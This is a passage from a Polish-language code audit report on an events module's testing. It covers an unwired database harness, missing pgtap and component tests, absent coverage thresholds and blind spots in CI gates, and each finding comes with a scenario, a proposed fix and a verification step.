**Scenariusz.** `adminMeetingFailure` zostaje uzyte poza studiem - np. w toascie globalnym, w powiadomieniu albo w nowym widoku listy spotkan, ktory nie wciaga `EventStudioModuleSections`. Nakladka `i18n-admin-event-meetings` nie jest zarejestrowana, `i18n.exists("adminEventMeetings.errors.tableInUse")` zwraca `false` i KAZDA z 44 odmow gieldy - „stolik zajety", „limit dzienny", „strefa czasowa nieznana" - degraduje sie do jednego […]

**Naprawa.** Dodac `import { ensureI18n as ensureMeetingsI18n } from "@/lib/i18n-admin-event-meetings";` i wywolanie `ensureMeetingsI18n();` w pierwszej linii `adminMeetingFailure` - jak w czterech siostrzanych modulach. Z testu `adminMeetingErrors.test.ts:9` usunac wtedy import nakladki, zeby test realnie dowodzil, ze modul radzi sobie sam.

**Weryfikacja.** src/lib/events/adminMeetingErrors.ts: jedyny import to i18n (linia 20), cialo adminMeetingFailure zaczyna sie od messageOf(error) (73-74) i wola i18n.exists(candidate) w linii 81 bez zadnego ensure. Siostry robia to konsekwentnie: adminAgendaErrors.ts:11 import + :48 ensureAgendaI18n(), adminOnsiteErrors.ts:11/:45, adminSponsorErrors.ts:11/:45, adminEventStudioErrors.ts:8/:27, a takze adminRegistrationErrors.ts […]

---

## Pokrycie testami

> Moduł ma DWIE bardzo różne połowy testów. Warstwa vitest jest liczna (ok. 130 plików, w tym ok. 75 w src/lib/events/**tests**) i — wbrew typowemu wzorcowi — realnie behawioralna: testy nazywają regułę, nie render (np. scannerPlane.test.ts sprawdza sklejanie leadów w kolejce, kolejność wysyłki i wykładnicze wycofanie; eventAttendeesList.test.tsx sprawdza, że gość NIE PYTA BAZY i że Chatham House zabiera siatkę osób). Warstwa bazy jest natomiast pusta w praktyce: 39 na 39 tabel event_* nie ma ani jednego testu pgtap, a jedyny plik modułu (event_admin_only_contract_test.sql, 5 asercji) czyta katalog pg_policies, nie zachowanie. Istnieje za to scripts/events-harness — ok. 10 000 linii realnych asercji runtime, które pokrywają dokładnie krytyczne reguły (room_conflict, speaker_overlap, session_full, lista rezerwowa, typ biletu nadaje grupę) — ale NIE MA wpisu check:* w package.json i nie jest wołany w żadnym workflow, czyli nie wykonuje się nigdy. Do tego cała płaszczyzna onsite (check-in, dedupe, lead scans, badge, checkpoints) i cała płaszczyzna meetings nie mają pliku asercji nawet w […]

### [KRYTYCZNY] Cały harness bazodanowy modułu Wydarzeń (10 065 linii asercji) nie jest wpięty w żadną bramkę — nie wykonuje się nigdy

`package.json:68` · brak-testow · weryfikacja: POTWIERDZONE

Repozytorium ma cztery równoległe harnessy replay+runtime. Trzy mają wpis w package.json: `"check:pg-harness": "bash scripts/pg-harness/run.sh"` (66), `"check:careers-harness"` (67), `"check:programs-harness"` (68). Czwarty — `scripts/events-harness/run.sh`, z 11 plikami `runtime_test.d/*.sql` o łącznej objętości 10 065 linii — NIE MA wpisu. `rg 'events-harness' .github/workflows/ package.json` (poza samym katalogiem harnessu) zwraca ZERO trafień, podczas gdy `check:pg-harness` stoi w ci.yml:654, `check:careers-harness` w ci.yml:664, `check:programs-harness` w ci.yml:678. To dokładnie ten sam tryb awarii, który ci.yml sam opisuje w komentarzu nad jobem `pg-harness` (ci.yml:596-600): „Audyt 2026-08-11 znalazł, że skrypt istniał od dawna i NIE BYŁ wpięty w żaden workflow - uruchamiał go wyłącznie człowiek, jeśli pamiętał. Dlatego `source_type = 'club_application'` łamiące CHECK na `crm_leads` trafiło na produkcję (...) a wszystkie bramki świeciły na zielono." Skutek jest tym dotkliwszy, […]

**Scenariusz.** Migracja Lovable redefiniuje `admin_event_session_save` i gubi sprawdzenie `room_conflict` albo przestawia ograniczenie EXCLUDE na `event_sessions`. `check:sql-*` czytają migracje jako TEKST i tego nie zobaczą, pgtap modułu sprawdza tylko pg_policies, a jedyne asercje, które by to złapały, leżą w pliku, którego CI nigdy nie uruchamia. Dwie sesje w tej samej sali o tej samej godzinie wchodzą na produkcję przy w pełni […]

**Naprawa.** Dodać do package.json `"check:events-harness": "bash scripts/events-harness/run.sh"` i krok `run: bun run check:events-harness` w jobie `pg-harness` w .github/workflows/ci.yml (obok trzech pozostałych, linie 654-678). Przed wpięciem uruchomić lokalnie i zaadresować ewentualną czerwień — README harnessu (scripts/events-harness/README.md) sam zaznacza, że `scripts/pg-harness` jest czerwony również na origin/main, więc […]

**Weryfikacja.** Sprawdzone bezpośrednio. package.json:66-68 zawiera dokładnie trzy harnessy (`check:pg-harness`, `check:careers-harness`, `check:programs-harness`) i ANI JEDNEGO wpisu dla events-harness; blok `scripts` konczy sie na `test:pgtap-local` (linia 69). `rg 'events-harness' --glob '!scripts/events-harness/**'` daje trafienia wylacznie w docs/ i w komentarzach migracji - ZERO w .github/workflows/ i ZERO w package.json. W […]

### [wysoki] 39 z 39 tabel event_* nie ma ani jednego testu pgtap; jedyny plik modułu sprawdza katalog, nie zachowanie

`supabase/tests/event_admin_only_contract_test.sql:24` · brak-testow · weryfikacja: POTWIERDZONE

Przeskanowałem wszystkie 100 plików w supabase/tests/ pod kątem każdej z 39 tabel modułu. Wynik: ZERO trafień dla event_sessions, event_registrations, event_checkins, event_lead_scans, event_meetings, event_groups, event_group_members, event_ticket_types, event_people, event_sponsors, event_pages, event_terms i pozostałych. Jedyne trafienie na 'event_types' to KOLUMNA `integration_endpoints.event_types` w cohesion_layer_test.sql:185 — inny moduł. Po stronie RPC: ze 145 nazw wołanych przez `supabase.rpc(...)` w src/lib/events, src/components/events i src/components/admin/events tylko DWIE mają jakikolwiek test pgtap (`get_event_rsvp_counts` i `my_ticket_allowance`) — i obie należą do STARSZEGO modułu community events, nie do Event Buildera. Jedyny plik pgtap modułu deklaruje `plan(5)` i cztery z pięciu asercji odpytują `pg_policies` / `pg_proc` (is_empty na politykach z 'editor', is_empty na politykach bez is_super_admin, matches na prosrc, cmp_ok >= 30 na liczbie polityk). […]

**Scenariusz.** Polityka RLS zachowuje poprawną TREŚĆ (wymienia admin i is_super_admin, nie wymienia editor — więc kontrakt strukturalny przechodzi), ale ma błąd w predykacie tenanta, np. porównuje `tenant_id` z tabelą nadrzędną zamiast z `current_tenant_id()`. Wszystkie 5 asercji świeci na zielono, a administrator najemcy A czyta rejestracje i skany leadów najemcy B.

**Naprawa.** Dopisać pgtap behawioralne dla najbardziej wrażliwych tabel, ustawiając `request.jwt.claims` na kolejne role i najemców i sprawdzając SELECT/INSERT: event_lead_scans (izolacja najemcy + brak dostępu roli innej niż admin/super_admin), event_registrations, event_checkins, event_group_members. Wzorzec jest gotowy w supabase/tests/rls_tenant_isolation_test.sql i tenant_isolation_three_tenants_test.sql.

**Weryfikacja.** Fakt potwierdzony: `rg -l` po supabase/tests/ (100 plikow) dla event_sessions, event_registrations, event_checkins, event_lead_scans, event_meetings, event_groups, event_ticket_types, event_people, event_sponsors, event_pages, event_terms daje 0 plikow dla KAZDEJ z nazw; `rg -l 'admin_event_|event_session|event_registration' supabase/tests/` nie zwraca nic. get_event_rsvp_counts/my_ticket_allowance sa tylko w […]

### [średni] 40 z 44 paneli studia (13 238 linii) nie ma żadnego testu komponentu

`src/components/admin/events/organisms/EventTrackWorkspace.tsx:1` · brak-testow · weryfikacja: POTWIERDZONE

Sprawdziłem każdą z 44 nazw z src/components/admin/events/organisms/*.tsx przeciwko wszystkim plikom _.test._ i _.spec._ w src i e2e. Wymienione gdziekolwiek są tylko cztery: EventCreateForm (src/components/admin/events/**tests**/eventCreateIssue.test.ts), EventPagesMenuPanel (EventPagesMenuPanel.test.tsx), EventTypesManager (EventTypesManager.test.tsx), EventsListManager (eventDeleteReachable.test.ts). Bez testu pozostaje 40 paneli, łącznie 13 238 linii, w tym całe podsystemy: agenda (AgendaSessionsPanel 423, AgendaTracksPanel 338, AgendaRoomsPanel, AgendaTimelinePanel, AgendaConflictsPanel, EventTrackWorkspace 853), onsite w komplecie (OnsiteDeskPanel, OnsiteCheckpointsPanel, OnsiteDevicesPanel, OnsiteBadgesPanel, OnsiteBadgePrintPanel 302, OnsiteLeadsPanel, OnsiteLogPanel, OnsiteStatsPanel, OnsiteLiveStatsPanel), spotkania w komplecie (MeetingSettingsPanel 473, MeetingsListPanel 359, MeetingTablesPanel, MeetingStatsPanel, ArrangeMeetingDialog), rejestracja (RegistrationsListPanel […]

**Scenariusz.** Zmiana nazwy pola w drafcie (np. `sessionDraft.ts` zmienia `allowOverlap` na `overlapAllowed`) łamie AgendaSessionsPanel. Test src/lib/events/**tests**/sessionDraft.test.ts nadal przechodzi, bo testuje sam moduł draftu; `tsc` przechodzi, jeśli panel czyta pole przez indeksowanie lub spread. Organizator zapisuje sesję, dostaje toast sukcesu, a flaga blokująca podwójny zapis nie zmienia się.

**Naprawa.** Priorytetowo pokryć panele, które zapisują nieodwracalny stan lub egzekwują regułę: AgendaSessionsPanel (zachowanie przy `room_conflict`/`speaker_overlap` z bazy), RegistrationsListPanel + RegistrationDecideDialog (decyzja o rejestracji), OnsiteDeskPanel (ręczna odprawa), EventGroupsPermissionsPanel (nadawanie uprawnień), EventTicketsPanel (typ biletu -> grupa). Wzorzec i atrapa RPC są gotowe: @/test/supabase/rpc […]

**Weryfikacja.** Przeliczylem sam: `ls src/components/admin/events/organisms/*.tsx | wc -l` = 44, `wc -l` sumarycznie = 13238 (uwaga: to suma WSZYSTKICH 44, wiec 40 nieprzetestowanych ma mniej - drobna nieścisłość w opisie). Petla po nazwach organizmow przeciw wszystkim _.test._/_.spec._ w src i e2e daje trafienia dla dokladnie czterech: EventCreateForm, EventPagesMenuPanel, EventTypesManager, EventsListManager. Katalog […]

### [średni] Brak jakiegokolwiek scenariusza e2e wydarzenia; jedyna suita z prawdziwą bazą nie dotyka modułu

`e2e/user-paths.spec.ts:1` · brak-testow · weryfikacja: POTWIERDZONE

Katalog e2e/ ma 8 plików. Wydarzeń dotyczą dwa: e2e/scanner.spec.ts (8 scenariuszy, wysokiej jakości — weryfikuje IndexedDB przez `readOutbox`, opróżnianie kolejki po powrocie sieci, usunięcie tokenu z paska adresu, przetrwanie kolejki przez reload) oraz e2e/ssr-degradation.spec.ts (marginalnie). scanner.spec.ts zaślepia jednak całą płaszczyznę danych na poziomie sieci — `page.route("**/rest/v1/rpc/event_scanner_bootstrap*")`, `event_checkin_record` (linie 75-88) — więc dowodzi zachowania URZĄDZENIA, a nie żadnej reguły bazy. Jedyna suita e2e pracująca na prawdziwym Supabase z migracjami i seedem to e2e/user-paths.spec.ts, uruchamiana w osobnym jobie `e2e-seeded` (.github/workflows/e2e.yml:119, po `supabase start` z pełnym seedem). `rg -c -i 'event|wydarz' e2e/user-paths.spec.ts` zwraca ZERO — suita „przechodzi przepływ redakcyjny" i nie wchodzi do modułu Wydarzeń. Potwierdza to seed: `rg -o 'event_[a-z_]+' supabase/seed.sql` daje tylko `event_id` i `event_speakers` (stary moduł), […]

**Scenariusz.** Regresja przecinająca warstwy — np. `admin_event_general_save` przestaje ustawiać `slug`, przez co publiczna trasa events.$slug zwraca 404 mimo zielonego panelu — nie jest wykrywalna przez żadną istniejącą bramkę: testy vitest są mockowane per warstwa, harness nie dotyka frontu (README: „Nie sprawdza kodu frontu"), a jedyne e2e z bazą nie odwiedza modułu.

**Naprawa.** Dopisać e2e/event-paths.spec.ts uruchamiane pod flagą E2E_SEEDED w jobie e2e-seeded (obok user-paths.spec.ts, e2e.yml:119) i rozszerzyć supabase/seed.sql o jedno opublikowane wydarzenie z typem, sesją, salą i typem biletu. Minimalny łańcuch: zalogowanie jako zaseedowany admin -> /admin/events/$id/general zapis -> /admin/events/$id/content/sessions dodanie sesji -> publiczna /events/$slug/agenda pokazuje tę sesję -> […]

**Weryfikacja.** Wszystkie trzy skladowe sprawdzone. `ls e2e/` daje 8 plikow (checkout, no-horizontal-pan, public, scanner, seo, ssr-completeness, ssr-degradation, user-paths). `rg -c -i 'event|wydarz' e2e/user-paths.spec.ts` konczy sie kodem 1 (zero trafien). `rg -o 'event_[a-z_]+' supabase/seed.sql | sort -u` zwraca dokladnie dwie nazwy: event_id i event_speakers - zadnej tabeli Event Buildera, wiec w zaseedowanej bazie nie ma po […]

### [średni] Brak progu pokrycia per-katalog dla trzech katalogów modułu — największa powierzchnia repozytorium bez własnej zapory

`vitest.config.ts:134` · ryzyko · weryfikacja: POTWIERDZONE

vitest.config.ts liczy ponad 3 700 linii i zawiera setki progów per-ścieżka, w tym bardzo drobiazgowe (np. `"src/lib/builder/schema.ts": { statements: 98, functions: 100, lines: 100, branches: 95 }` w linii 289, `"src/lib/seo/**"` w linii 399, `"src/lib/links/**"` w linii 452). Wyszukanie 'events' w tym pliku daje TRZY trafienia i wszystkie dotyczą innych modułów: src/lib/email/auth-events.server.ts (1795), src/lib/newsletter-popup-events.functions.ts (2159) i komentarz w 1792. Nie ma ANI JEDNEGO wpisu dla `src/lib/events/**` (ok. 180 plików), `src/components/events/**` ani `src/components/admin/events/**` (44 organizmy + 24 molecules + studio). Obowiązuje wyłącznie próg globalny: statements 64, functions 62, lines 65, branches 58 (linie 134-137), liczony po CAŁYM src/ z `all: true` (linia 65). Przy 40 nieprzetestowanych panelach o łącznej objętości 13 238 linii moduł niemal na pewno leży poniżej tego progu, ale jest przez resztę repozytorium rozcieńczony do niewidoczności. Komentarz […]

**Scenariusz.** Autor dopisuje kolejne 2 000 linii paneli studia bez testów. Pokrycie modułu spada z (powiedzmy) 55% do 45%, ale liczba globalna rusza się o ułamek punktu i zostaje nad progiem 65. Bramka pokrycia świeci na zielono przez cały czas budowy modułu i nigdy nie sygnalizuje, że największa powierzchnia repozytorium jest najsłabiej pokryta.

**Naprawa.** Zmierzyć obecny stan (`vitest run --coverage --coverage.include='src/lib/events/**' --coverage.include='src/components/events/**' --coverage.include='src/components/admin/events/**'`) i wpisać trzy progi per-ścieżka tuż poniżej zmierzonego poziomu — dokładnie tą samą regułą „zmierzone minus ~4 pp marginesu", którą plik stosuje w komentarzu przy linii 127. Bez progu każda przyszła praca nad modułem jest niemierzalna.

**Weryfikacja.** Sprawdzone: vitest.config.ts ma 3750 linii, `all: true` stoi w linii 65, `include: ['src/**/*.{ts,tsx}']` w 66, progi globalne statements 64 / functions 62 / lines 65 / branches 58 w liniach 134-137. `rg 'events' vitest.config.ts` daje DOKLADNIE trzy trafienia i wszystkie dotycza innych modulow: komentarz 1792, 'src/lib/email/auth-events.server.ts' 1795, 'src/lib/newsletter-popup-events.functions.ts' 2159. Nie ma […]

### [średni] Cała płaszczyzna onsite i cała płaszczyzna meetings nie mają asercji nawet w harnessie — wpięcie go do CI ich nie pokryje

`scripts/events-harness/runtime_test.d/00_smoke.sql:1` · brak-testow · weryfikacja: POTWIERDZONE

Pliki asercji harnessu to: 00_smoke, 10_sessions, 20_registration, 30_sponsors, 40_speakers, 70_admissions, 80_admin_only, 90_module_pages, 95_attendees_and_discussions, 96_section_content_sources, 97_speaker_bio_gate. Brakuje numerów 50 i 60, które odpowiadałyby migracjom 20260823180000_event_onsite.sql i 20260823190000_event_meetings.sql. Potwierdzenie przez wyszukanie w całym katalogu runtime_test.d: `event_checkin_record`, `event_lead_scan_record`, `event_scanner_bootstrap`, `event_checkins`, `event_lead_scans`, `event_badge_prints`, `event_checkpoints`, `event_meetings`, `event_meeting_settings`, `admin_event_meeting` — KAŻDA z tych nazw daje zero trafień. To znaczy, że nawet po naprawie finding #1 dwie płaszczyzny modułu (odprawa na miejscu i giełda spotkań 1-1) zostaną bez jakiejkolwiek weryfikacji wykonawczej. Okno dedupe check-inu jest przy tym parametrem tabeli (`event_checkpoints.dedupe_window_seconds`, cytowane w e2e/scanner.spec.ts:38), a migracja […]

**Scenariusz.** Wolontariusz skanuje ten sam bilet dwa razy w ciągu sekundy (typowe przy zacięciu czytnika). Regresja w `event_checkin_record` gubi okno dedupe: powstają dwa wiersze w event_checkins, licznik obecnych na OnsiteLiveStatsPanel podwaja osobę, a raport frekwencji dla klienta wydarzenia jest zawyżony. Nic w CI tego nie łapie — e2e/scanner.spec.ts zaślepia `event_checkin_record` na poziomie sieci (linia 79), więc testuje […]

**Naprawa.** Dopisać scripts/events-harness/runtime_test.d/50_onsite.sql i 60_meetings.sql. Minimalny zestaw dla 50_onsite: dwa `event_checkin_record` tym samym kodem w oknie dedupe -> jeden wiersz i `repeat_count` > 0; skan na wygasłym poświadczeniu -> odmowa; `event_lead_scan_record` z poświadczenia urządzenia sponsora A -> lead niewidoczny dla sponsora B; checkpoint `in_only` -> odrzucenie kierunku 'out'.

**Weryfikacja.** Zweryfikowane wyczerpujaco. `ls scripts/events-harness/runtime_test.d/` zwraca dokladnie 11 plikow: 00_smoke, 10_sessions, 20_registration, 30_sponsors, 40_speakers, 70_admissions, 80_admin_only, 90_module_pages, 95_attendees_and_discussions, 96_section_content_sources, 97_speaker_bio_gate - brak 50/60. `rg -c` po calym katalogu runtime_test.d dla event_checkin_record, event_lead_scan_record, […]

### [średni] check:gate-coverage jest strukturalnie ślepa na osierocone skrypty — nie mogła i nie może wykryć problemu #1

`src/lib/ci/gateCoverage.ts:174` · luka-funkcjonalna · weryfikacja: POTWIERDZONE

Bramka meta deklaruje inwariant „każda bramka `check:*` z package.json jest wpięta w workflow, dokładnie raz na job, i żaden krok nie woła skryptu, którego nie ma" (scripts/check-gate-coverage.ts:1-3). Jej zbiór startowy to jednak wyłącznie package.json: `analyzeGateCoverage(readScriptNames(), scanGateInvocations(readWorkflows()))` (scripts/check-gate-coverage.ts:50), a w środku `const known = new Set(scripts)` i `const gates = scripts.filter((name) => name.startsWith("check:"))` (src/lib/ci/gateCoverage.ts:174-175). Raport ma trzy pola: `unwired` (bramki z package.json bez wywołania), `unknown` (skrypty wołane w workflow, których nie ma w package.json) i `duplicated` (gateCoverage.ts:159-168). ŻADNE z nich nie odpowiada na pytanie „czy w scripts/ leży wykonywalna bramka, która nigdy nie dostała wpisu w package.json". To właśnie stan scripts/events-harness/run.sh: nie jest `unwired`, bo nie jest bramką w rozumieniu package.json; nie jest `unknown`, bo żaden workflow go nie woła. Jest […]

**Scenariusz.** Autor dodaje piąty harness (np. dla kolejnego modułu), zapomina wpisu w package.json. `check:gate-coverage` przechodzi na zielono, raportując pełne pokrycie bramek, a nowy harness — tak jak events-harness — nie uruchamia się nigdy. Bramka pilnująca bramek zapewnia, że wszystko jest wpięte, i się myli.

**Naprawa.** Rozszerzyć analyzeGateCoverage o czwarte pole `orphanScripts`: przeskanować `scripts/*/run.sh` oraz `scripts/check-*.ts` i zgłosić każdy plik, do którego nie prowadzi żaden skrypt z package.json. Runner ma już `readdirSync` (scripts/check-gate-coverage.ts:16), więc zmiana jest lokalna, a logika trafia do modułu czystego, który ma własny test (src/lib/ci/**tests**/gateCoverage.test.ts).

**Weryfikacja.** Przeczytalem obie warstwy. scripts/check-gate-coverage.ts:50 to dokladnie `analyzeGateCoverage(readScriptNames(), scanGateInvocations(readWorkflows()))`, a readScriptNames() (:33-36) czyta WYLACZNIE Object.keys(manifest.scripts) z package.json; readWorkflows() (:38-47) czyta tylko .github/workflows/*.yml. W src/lib/ci/gateCoverage.ts:174-175 stoi `const known = new Set(scripts)` i `const gates = […]

### [średni] check:rpc-contract sprawdza tylko istnienie nazwy RPC — nie nazwy argumentów ani kształt zwrotu, a dla onsite/meetings nie ma nic w zapasie

`src/lib/ci/rpcContract.ts:242` · ryzyko · weryfikacja: POTWIERDZONE

Bramka wykonuje dwa sprawdzenia: `missingFunctions = called.filter((rpc) => !definedByName.has(rpc.name) && ...)` (linia 242) oraz sprawdzenie, czy ciało funkcji wskazuje istniejącą relację (`bodyMentionsRelation`, linia ~190). Zbiór `definedByName` budowany jest z samych NAZW (linie 238-239), a klucz stanu opisany jest jako `schema.nazwa/arność` (linia 35) — czyli co najwyżej liczba argumentów, nigdy ich nazwy. Dla modułu, w którym niemal każde RPC ma sygnaturę `(p_payload jsonb)` i czyta pola po nazwie, arność jest bezużyteczna jako sygnał. Ryzyko jest realne, bo Postgres po cichu ignoruje nieznane pole jsonb — dokładnie tak, jak opisuje to nagłówek src/lib/events/**tests**/meetingsApi.test.ts:4-8. Warstwa vitest broni się przed tym punktowo (meetingsApi.test.ts testuje nazwy kluczy dla giełdy spotkań), ale nie ma analogicznego testu dla onsiteApi.ts ani scannerApi.ts, a płaszczyzna onsite nie ma też asercji w harnessie (finding #3) ani w pgtap (finding #2). Sprawdziłem punktowo dwa […]

**Scenariusz.** Migracja Lovable przedeklarowuje `admin_event_badge_template_delete(_id uuid)` jako `(p_id uuid)`. `check:rpc-contract` przechodzi (nazwa i arność bez zmian), `tsc` przechodzi (argumenty RPC są luźnym obiektem), a PostgREST zwraca 404 „function not found" dopiero w przeglądarce organizatora. Ani jedna bramka ani jeden test tego nie łapie, bo płaszczyzna onsite nie ma pokrycia bazodanowego.

**Naprawa.** Rozszerzyć rpcContract o porównanie NAZW argumentów: `extractExpectedContract` już parsuje sygnatury, wystarczy zachować listę nazw i porównać z kluczami literału przekazanego do `supabase.rpc(...)` tam, gdzie jest on literałem obiektowym. Jako tańsze uzupełnienie natychmiastowe — dopisać dla onsiteApi.ts i scannerApi.ts test kontraktu kluczy payloadu na wzór src/lib/events/**tests**/meetingsApi.test.ts.

**Weryfikacja.** Kod zgadza sie z opisem. src/lib/ci/rpcContract.ts:238-239 buduje `definedByName` z samych nazw (`contract.functions.map((fn) => fn.name)` + `def.name.replace(/^public\./, '')`), a :241-243 to `missingFunctions = called.filter((rpc) => !definedByName.has(rpc.name) && externalRpcs[rpc.name] === undefined)`. Klucz RpcDefinition opisany jest jako 'schema.nazwa/arnosc' w :35 - nazw argumentow nie ma nigdzie. Drugie […]

### [niski] Bramka słownika błędów agendy iteruje po ręcznie przepisanej liście kluczy — nowy RAISE bez tłumaczenia przechodzi na zielono; btree_gist_missing już tak […]

`src/lib/events/__tests__/adminAgendaErrors.test.ts:17` · luka-funkcjonalna · weryfikacja: POTWIERDZONE

Test deklaruje w nagłówku, że istnieje po to, by „nowy `RAISE EXCEPTION` bez wpisu w słowniku" nie pokazał użytkownikowi surowego klucza (linie 4-6). Realizuje to jednak pętlą po stałej wpisanej ręcznie do pliku testu: `const SQL_KEYS = [...]` (linia 17), 37 pozycji, a asercja to `for (const key of SQL_KEYS) expect(i18n.exists(...))` (linia 70). Zbiór jest więc podawany testowi, a nie odczytywany ze źródła prawdy. Wyekstrahowałem faktyczne klucze z migracji: `rg -o "RAISE EXCEPTION '([a-z_]+)" supabase/migrations/20260823140000_event_sessions.sql` daje 39 nazw. Różnica względem SQL_KEYS to `forbidden` i `btree_gist_missing`. `forbidden` ma tłumaczenie (src/lib/i18n-admin-event-agenda.ts:437 PL, :899 EN), ale `btree_gist_missing` — podnoszony w 20260823140000_event_sessions.sql:569 komunikatem „klasa gist_uuid_ops nie istnieje - kolizje sal nie da sie wymusic" — NIE MA odpowiednika `btreeGistMissing` w słowniku. Bramka tego nie zgłasza, bo klucza nie ma na jej własnej liście. Ten sam […]

**Scenariusz.** Instalacja bez rozszerzenia btree_gist: `admin_event_room_save` (albo migracja tworząca ograniczenie EXCLUDE) podnosi `btree_gist_missing`. `adminAgendaFailure` nie rozpoznaje klucza i spada do `adminEventAgenda.errors.unknown` (zachowanie potwierdzone testem w linii 102), więc organizator dostaje ogólne „coś poszło nie tak" zamiast informacji, że kolizji sal NIE DA SIĘ egzekwować — czyli komunikat gubi dokładnie tę […]

**Naprawa.** Zamienić stałą SQL_KEYS na odczyt ze źródła: przeskanować supabase/migrations/*.sql regeksem `RAISE EXCEPTION '([a-z_]+):` w funkcjach `admin_event_*`/`event_session_*` i iterować po wyniku (wzorzec skanowania plików jest już w tym repo — src/lib/ci/i18nKeyUsage.ts, używany przez eventsI18nKeys.gate.test.ts). Niezależnie od tego dopisać `btreeGistMissing` do PL i EN w src/lib/i18n-admin-event-agenda.ts.

**Weryfikacja.** Mechanizm potwierdzony: src/lib/events/**tests**/adminAgendaErrors.test.ts:17 to `const SQL_KEYS = [` - stala 37 pozycji wpisana recznie do pliku testu, a asercja w :70 iteruje po niej (`for (const key of SQL_KEYS)`), wiec zbior jest podawany testowi, nie odczytywany ze zrodla. Ekstrakcja z migracji potwierdza roznice: `rg -o "RAISE EXCEPTION '([a-z_]+)" supabase/migrations/20260823140000_event_sessions.sql | sort […]

### [niski] Harness pomija migrację z 35 politykami RLS modułu — jego asercje admin-only testują nieaktualny zestaw polityk

`scripts/events-harness/run.sh:126` · niespojnosc · weryfikacja: POTWIERDZONE

Harness dobiera migracje do replayu treścią, nie listą: `MIGRATIONS="$(grep -lE 'public\.admin_event_|events_tenant_id_key|events-harness: include' "$REPO"/supabase/migrations/*.sql | sort -u)"`. Ten wzorzec łapie 70 plików, ale NIE łapie dwóch migracji, które zawierają wyłącznie `CREATE POLICY` bez definicji funkcji `admin_event_*`: 20260824101451_98a0f340-c9c9-4198-a576-ea6694edff2f.sql (3 polityki event_*) i — kluczowa — 20260825192230_1db077f2-762b-474b-a1c4-42c1d8dc59eb.sql, która zawiera 35 wystąpień `CREATE POLICY "event_*` i jest CHRONOLOGICZNIE OSTATNIĄ definicją polityk dla m.in. event_lead_scans, event_groups, event_meeting_attendees, event_meeting_availability, event_meeting_rule_groups (linie 78-88 i dalej). Baza harnessu kończy więc replay z politykami z 20260825170000_event_rls_admin_only.sql, a produkcja pracuje na politykach z 20260825192230. Autor run.sh był świadom ryzyka wzorca — komentarz w liniach 103-121 opisuje dokładnie problem migracji, których grep nie […]

**Scenariusz.** runtime_test.d/80_admin_only.sql przechodzi na zielono, bo weryfikuje polityki z 20260825170000. Regresja wprowadzona w 20260825192230 (albo w dowolnej przyszłej migracji tego kształtu — sam CREATE POLICY, bez funkcji admin_event_*) jest dla harnessu niewidzialna, mimo że to ona obowiązuje na produkcji. Harness raportuje bezpieczeństwo schematu, którego nikt nie uruchamia.

**Naprawa.** Dopisać komentarz `-- events-harness: include` na początku 20260824101451_98a0f340…sql i 20260825192230_1db077f2…sql, albo rozszerzyć wzorzec grep w run.sh:126 o `CREATE POLICY "event_`. Drugie rozwiązanie jest trwalsze — nowe migracje polityk wchodzą wtedy pod harness automatycznie, tak jak nowe tabele wchodzą pod kontrakt pgtap (ten sam zamysł co imienna lista wyjątków w event_admin_only_contract_test.sql:37).

**Weryfikacja.** Faktografia zgadza sie co do znaku. Odtworzylem selektor z scripts/events-harness/run.sh:126-127 (`grep -lE 'public\.admin_event_|events_tenant_id_key|events-harness: include'`): 70 plikow, a `grep -c '20260824101451|20260825192230'` w wyniku = 0, czyli obie migracje sa POZA replayem. 20260825192230_1db077f2-...sql ma 35 wystapien CREATE POLICY (wszystkie na tabelach event_*), w tym event_lead_scans_staff_read w […]

### [niski] Reguła „partner widzi tylko swoje leady" nie ma testu na żadnej warstwie

`supabase/migrations/20260825192230_1db077f2-762b-474b-a1c4-42c1d8dc59eb.sql:78` · brak-testow · weryfikacja: POTWIERDZONE

Ostateczna polityka odczytu skanów leadów to `event_lead_scans_staff_read` z 20260825192230…sql:78-88 — dopuszcza wyłącznie `has_role(uid,'admin')` lub `is_super_admin(uid)` w obrębie `current_tenant_id()`. Rozgraniczenie „który sponsor widzi który lead" nie jest więc realizowane przez RLS, tylko wewnątrz ścieżek zapisu i odczytu (tabela ma `sponsor_id`, przypisywany przez poświadczenie urządzenia — patrz `sponsor_id` w sesji skanera, e2e/scanner.spec.ts:26, oraz `ON CONFLICT (tenant_id, sponsor_id, lead_id)` w 20260823160000_event_sponsors_companies.sql:2256). Taka konstrukcja jest do obrony, ale wymaga testu zachowania, bo cała ochrona leży w ciele funkcji, nie w polityce. Tymczasem: `event_lead_scans` nie występuje w żadnym pliku supabase/tests/ ani w żadnym pliku scripts/events-harness/runtime_test.d/ (obie weryfikacje wykonane), a po stronie vitest `sponsor_id` pojawia się tylko w testach mockowanych (src/lib/events/**tests**/sponsorsApi.test.ts, scannerPlane.test.ts), które nie […]

**Scenariusz.** Regresja w `event_lead_scan_record` lub w funkcji listującej leady gubi filtr po `sponsor_id` wyprowadzonym z poświadczenia urządzenia. Sponsor A pobiera z OnsiteLeadsPanel eksport zawierający leady sponsora B — czyli dane kontaktowe osób, które zgodziły się na przekazanie ich innemu podmiotowi. To wyciek danych osobowych między klientami tego samego wydarzenia, którego żadna bramka ani żaden test nie wykryje.

**Naprawa.** Dopisać asercję w planowanym scripts/events-harness/runtime_test.d/50_onsite.sql: dwa sponsory, dwa urządzenia z osobnymi poświadczeniami, po jednym `event_lead_scan_record` z każdego, następnie odczyt listy leadów w kontekście sponsora A -> dokładnie jeden wiersz, i ten sam odczyt dla sponsora B -> dokładnie jeden, rozłączny. Równolegle pgtap na `event_lead_scans` z ustawionym `request.jwt.claims` potwierdzający, […]

**Weryfikacja.** Brak pokrycia potwierdzony: event_lead_scans daje 0 trafien w supabase/tests/ i 0 w scripts/events-harness/runtime_test.d/ (obie petle wykonane). Polityka event_lead_scans_staff_read w 20260825192230_1db077f2-...sql:78-88 istnieje dokladnie tak, jak opisano - `tenant_id = current_tenant_id() AND (has_role(uid,'admin') OR is_super_admin(uid))`, bez rozroznienia sponsorow. Znalazlem miejsce, w ktorym granica sponsora […]

---

## Ustalenia obalone przy weryfikacji

Zgłoszone przez recenzenta, odrzucone po sprawdzeniu w kodzie.

- **Model nawigacji deklaruje „nie ma tu atrap", a dwie pozycje sa drogowskazami bez wlasnej powierzchni** (Szkielet studia i nawigacja) — Regula z naglowka brzmi (src/lib/events/eventStudioNav.ts:33-36, a nie 41-46): „NIE MA TU ATRAP. W nawigacji stoi tylko to, co realnie istnieje jako ekran (...) ich pozycje maja byc NIEOBECNE, a nie puste" - i wylicza konkretne pozycje wzorca bez ekranu (People, Items, Feed channels, Discussions, Exhibitors, Exhibitor Marketplace, Codes). `communications` i `integrations` […]
